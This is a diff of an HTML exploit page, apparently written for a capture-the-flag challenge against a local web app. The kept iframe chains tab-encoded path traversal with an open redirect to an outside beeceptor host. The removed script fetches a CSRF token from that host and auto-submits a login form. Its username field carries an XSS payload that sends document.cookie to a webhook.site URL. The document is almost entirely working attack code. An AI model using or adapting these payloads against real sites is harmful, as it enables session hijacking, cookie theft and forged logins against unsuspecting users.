@@ -2,65 +2,6 @@
 <html>
   <body>
     <iframe src="http://127.0.0.1:58039/rules?q=.%09./.%09./redirect?url=https://zrfezffez.free.beeceptor.com/test"></iframe>
-    <form id="formSub" action="http://127.0.0.1:58039/login" method="post">
-      <label for="username">Username:</label>
-      <input type="text" id="username" name="username">
-      <br>
-      <label for="password">Password:</label>
-      <input type="password" id="password" name="password">
-      <input type="hidden" name="_csrf" id="csrf">
-      <br>
-      <input type="submit" value="Login">
-  </form>
-    <script>
-      var token = null
 
-      function submitForm() {
-        var form = document.getElementById('formSub');
-        console.log(form)
-        form.submit(); // Submit the form programmatically
-      }
-       function finish() {
-
-        document.getElementById('username').value = `<img src=x onerror="window.location.href='https://webhook.site/3efaae97-8a81-454e-81cd-1e019a8ce4e5?u='+document.cookie" />`;
-        document.getElementById('password').value = "oko";
-        document.getElementById('csrf').value = token
-        submitForm()
-
-      };
-      function delay(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-      }
-      async function main(){
-        await delay(2000); 
-        await getOrderId()
-        finish()
-      }
-      try{
-        main()
-      }catch(err){
-        console.log(err)
-      }
-      
-
-     
-
-      async function getOrderId() {
-        try {
-          const response = await fetch('https://zrfezffez.free.beeceptor.com/retreive');
-
-          if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-          }
-
-          const data = await response.json();
-          token = data.orderId;
-
-          console.log('Retrieved orderId:', orderId);
-        } catch (error) {
-          console.error('Error fetching orderId:', error);
-        }
-      }
-    </script>
   </body>
 </html>
